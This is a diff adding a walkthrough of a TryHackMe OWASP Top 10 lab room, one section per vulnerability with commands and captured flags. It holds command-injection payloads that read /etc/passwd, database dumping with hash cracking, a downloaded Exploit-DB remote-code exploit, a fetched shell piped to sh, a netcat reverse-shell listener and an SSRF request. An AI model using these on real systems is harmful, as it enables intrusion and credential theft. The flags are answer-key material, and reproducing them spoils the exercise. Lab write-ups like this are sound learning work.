@@ -1,0 +1,124 @@
+OWASP Top 10 – TryHackMe Walkthrough
+Room: owasp_top10_2021_v1.2-badr
+Difficulty: Easy/Intermediate
+Time Spent: ~120 minutes
+Tools: curl, sqlite3, Burp Suite, python exploit scripts, Burp Intruder, browser dev tools
+===============================================================
+
+1. Broken Access Control (IDOR)
+--------------------------------
+Description:
+  - Parameter tampering to access others' notes.
+Commands:
+  curl "http://VICTIM_IP/note.php?note_id=0&user=noot" -b cookie.txt
+Flag:
+  - flag{fivefourthree}
+
+2. Cryptographic Failures
+--------------------------
+Description:
+  - Downloaded the SQLite DB, extracted password hash, cracked it.
+Commands:
+  curl -O http://VICTIM_IP/assets/webapp.db
+  sqlite3 webapp.db ".tables"
+  sqlite3 webapp.db "SELECT username,password FROM users;"
+  echo '6eea9b7ef19179a06954edd0f6c05ceb' | hash-cracker
+  curl -X POST -d "username=admin&password=qwertyuiop" http://VICTIM_IP/login
+Flag:
+  - THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
+
+3. Injection (Command Injection)
+---------------------------------
+Description:
+  - Injected commands via URL parameter.
+Commands:
+  curl "http://VICTIM_IP/?mooing=\$(whoami)"
+  curl "http://VICTIM_IP/?mooing=\$(cat+/etc/passwd)"
+Result:
+  - Discovered drpepper.txt, user ‘apache’
+
+4. Insecure Design
+-------------------
+Description:
+  - Abused password reset with known question answer.
+Process:
+  - Reset password for user ‘joseph’; answer “Green” in Burp replay.
+Flag:
+  - THM{Not_3ven_c4tz_c0uld_sav3_U!}
+
+5. Security Misconfiguration
+-----------------------------
+Description:
+  - Werkzeug debug console exposed.
+Process:
+  - Accessed /console, ran Python: import os; print(os.popen("cat todo.db").read())
+Flag:
+  - THM{Just_a_tiny_misconfiguration}
+
+6. Vulnerable & Outdated Components
+------------------------------------
+Description:
+  - Used public exploit from Exploit-DB for remote code execution.
+Exploit Link:
+  - https://www.exploit-db.com/exploits/47887
+Commands:
+  wget https://www.exploit-db.com/download/47887 -O exploit.py
+  python3 exploit.py http://VICTIM_IP
+  curl http://VICTIM_IP/shell.php | sh
+  nc -lvnp 4444
+  cat /opt/flag.txt
+Flag:
+  - THM{But_1ts_n0t_myf4ult!}
+
+7. Identification & Authentication Failures
+--------------------------------------------
+Description:
+  - Bypassed duplicate-user checks by prefixing spaces.
+Process:
+  - Registered " darren" and " arthur".
+Flags:
+  - fe86079416a21a3c99937fea8874b667
+  - d9ac0f7db4fda460ac3edeb75d75e16e
+
+8. Software & Data Integrity Failures
+--------------------------------------
+Description:
+  - Checked Subresource Integrity (SRI) hash in page source.
+Process:
+  - Observed script tag with sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
+
+9. Data Integrity Failures
+---------------------------
+Description:
+  - Manipulated JWT cookie to gain admin.
+Process:
+  - Logged in as guest, inspected jwt-session cookie, tampered it.
+Flag:
+  - THM{Dont_take_cookies_from_strangers}
+
+10. Security Logging & Monitoring Failures
+-------------------------------------------
+Description:
+  - Failed login attempts were logged but not mitigated.
+Observation:
+  - Brute-force attempts from external IP: ATTACKER_IP
+
+11. Server-Side Request Forgery (SSRF)
+---------------------------------------
+Description:
+  - SSRF on /download endpoint to access localhost-only admin panel.
+Commands:
+  curl -v "http://VICTIM_IP/download?server=http://127.0.0.1:8087/admin"
+Result:
+  - Response: "Admin interface only available from localhost!!!"
+
+===============================================================
+Bash Command Summary
+---------------------------------------------------------------
+curl -O URL                 # Download files (DB, exploits)
+sqlite3 DB "SQL query"     # Extract data from SQLite
+echo 'HASH' | hash-cracker # Crack hash
+python3 exploit.py URL     # Exploit vulnerable component
+nc -lvnp LPORT             # Catch reverse shell listener
+curl "URL?param=$\(...)"    # Test command injection
+curl -v ... server=http://localhost/admin # SSRF exploit
